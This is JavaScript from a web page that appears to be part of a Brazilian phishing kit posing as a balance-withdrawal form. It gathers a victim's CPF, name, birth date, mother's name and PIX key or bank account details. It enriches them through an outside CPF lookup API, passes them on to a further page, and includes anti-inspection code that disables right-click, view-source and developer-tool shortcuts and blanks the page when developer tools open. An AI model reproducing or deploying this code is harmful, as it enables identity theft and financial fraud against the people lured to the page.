<script>
var params = new URLSearchParams(window.location.search);
var cpf   = params.get('cpf')   || '';
var nome  = params.get('nome')  || '';
var nasc  = params.get('nasc')  || '';
var mae   = params.get('mae')   || '';
var valor = params.get('valor') || '5.874,13';
var metodo = 'pix';

function fmtCpf(c){
  c = c.replace(/\D/g,'');
  return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
}
function validarCPF(cpf){
  cpf=cpf.replace(/\D/g,'');
  if(cpf.length!==11) return false;
  if(/^(\d)\1+$/.test(cpf)) return false;
  var s=0;
  for(var i=0;i<9;i++) s+=parseInt(cpf[i])*(10-i);
  var r=s%11<2?0:11-s%11;
  if(r!==parseInt(cpf[9])) return false;
  s=0;
  for(var i=0;i<10;i++) s+=parseInt(cpf[i])*(11-i);
  r=s%11<2?0:11-s%11;
  return r===parseInt(cpf[10]);
}

if(nome) document.getElementById('cardNome').textContent = nome.toUpperCase();
if(cpf){
  document.getElementById('cardCpf').textContent = 'CPF: ' + fmtCpf(cpf);
  document.getElementById('pixInput').value = fmtCpf(cpf);
}
if(valor) document.getElementById('cardValor').textContent = 'R$ ' + valor;

// Busca API
if(cpf && !nome){
  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
    .then(function(r){return r.json();})
    .then(function(d){
      if(d.nome){ document.getElementById('cardNome').textContent = d.nome.toUpperCase(); nome=d.nome; }
      if(d.valor){ document.getElementById('cardValor').textContent = 'R$ '+d.valor; valor=d.valor; }
      if(d.nascimento && !nasc){ nasc = d.nascimento; }
      if(d.nome_mae && !mae){ mae = d.nome_mae; }
    }).catch(function(){});
}

function selecionarMetodo(m){
  metodo = m;
  if(m==='pix'){
    document.getElementById('btnPix').classList.add('ativo');
    document.getElementById('btnTed').classList.remove('ativo');
    document.getElementById('btnPix').querySelector('.metodo-icon').style.background='#1a1f8c';
    document.getElementById('btnTed').querySelector('.metodo-icon').style.background='#e8e8e8';
    document.getElementById('btnTed').querySelector('svg').setAttribute('fill','#888');
    document.getElementById('btnPix').querySelector('svg').setAttribute('fill','white');
    document.getElementById('formPix').style.display='block';
    document.getElementById('formBanco').style.display='none';
  } else {
    document.getElementById('btnTed').classList.add('ativo');
    document.getElementById('btnPix').classList.remove('ativo');
    document.getElementById('btnTed').querySelector('.metodo-icon').style.background='#1a1f8c';
    document.getElementById('btnPix').querySelector('.metodo-icon').style.background='#e8e8e8';
    document.getElementById('btnPix').querySelector('svg').setAttribute('fill','#888');
    document.getElementById('btnTed').querySelector('svg').setAttribute('fill','white');
    document.getElementById('formBanco').style.display='block';
    document.getElementById('formPix').style.display='none';
  }
}

function selecionarChave(tipo, el){
  document.querySelectorAll('.chip').forEach(function(c){c.classList.remove('ativo');});
  el.classList.add('ativo');
  document.getElementById('pixLabel').textContent = 'Chave PIX (' + tipo + ')';
  if(tipo==='CPF') document.getElementById('pixInput').value = fmtCpf(cpf);
  else document.getElementById('pixInput').value = '';
  document.getElementById('pixInput').placeholder = 'Digite sua chave PIX (' + tipo + ')';
}

function selecionarBanco(banco, el){
  document.querySelectorAll('.chip-banco').forEach(function(c){c.classList.remove('ativo');});
  el.classList.add('ativo');
  document.getElementById('inputBanco').value = banco;
}

function confirmar(){
  var url = '../8/index.html?cpf=' + cpf;
  if(nome)  url += '&nome='  + encodeURIComponent(nome);
  if(nasc)  url += '&nasc='  + encodeURIComponent(nasc);
  if(mae)   url += '&mae='   + encodeURIComponent(mae);
  if(valor) url += '&valor=' + encodeURIComponent(valor);

  if(metodo === 'pix'){
    var pixVal   = document.getElementById('pixInput').value.trim();
    var tipoChave = document.querySelector('.chip.ativo') ? document.querySelector('.chip.ativo').textContent.trim() : 'CPF';
    if(tipoChave === 'CPF' && (!pixVal || !validarCPF(pixVal))){
      alert('Digite um CPF válido para a chave PIX!');
      return;
    }
    url += '&tipo-operacao=PIX';
    url += '&tipo-chave=' + encodeURIComponent(tipoChave);
    if(pixVal) url += '&PIX=' + encodeURIComponent(pixVal);
  } else {
    var banco   = document.getElementById('inputBanco').value.trim();
    var agencia = document.getElementById('inputAgencia').value.trim();
    var conta   = document.getElementById('inputConta').value.trim();
    url += '&tipo-operacao=' + encodeURIComponent('Conta Bancária');
    if(banco)   url += '&nome-banco=' + encodeURIComponent(banco);
    if(agencia) url += '&agencia='    + encodeURIComponent(agencia);
    if(conta)   url += '&numero-conta=' + encodeURIComponent(conta);
  }
  // Repassa UTMs
  ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k){
    var v = params.get(k);
    if(v) url += '&' + k + '=' + encodeURIComponent(v);
  });
  window.location.href = url;
}
</script>
<script>
// ── Segurança ──────────────────────────────────────────────────────────────────
document.addEventListener('contextmenu',function(e){e.preventDefault();});
document.addEventListener('selectstart',function(e){var t=e.target.tagName;if(t==='INPUT'||t==='TEXTAREA'||t==='SELECT')return;e.preventDefault();});
document.addEventListener('dragstart',function(e){e.preventDefault();});
document.addEventListener('keydown',function(e){
  if(e.ctrlKey&&['u','U','s','S','i','I','j','J'].indexOf(e.key)>-1){e.preventDefault();return false;}
  if(e.key==='F12'){e.preventDefault();return false;}
});
(function(){try{if(window.self!==window.top&&window.top.location.hostname!==window.self.location.hostname){document.body.style.display='none';}}catch(e){document.body.style.display='none';}})();
(function(){var t=160;var timer;window.addEventListener('resize',function(){clearTimeout(timer);timer=setTimeout(function(){if(window.outerWidth-window.innerWidth>t&&window.outerHeight-window.innerHeight>t){document.body.innerHTML='';}},300);});})();
</script>
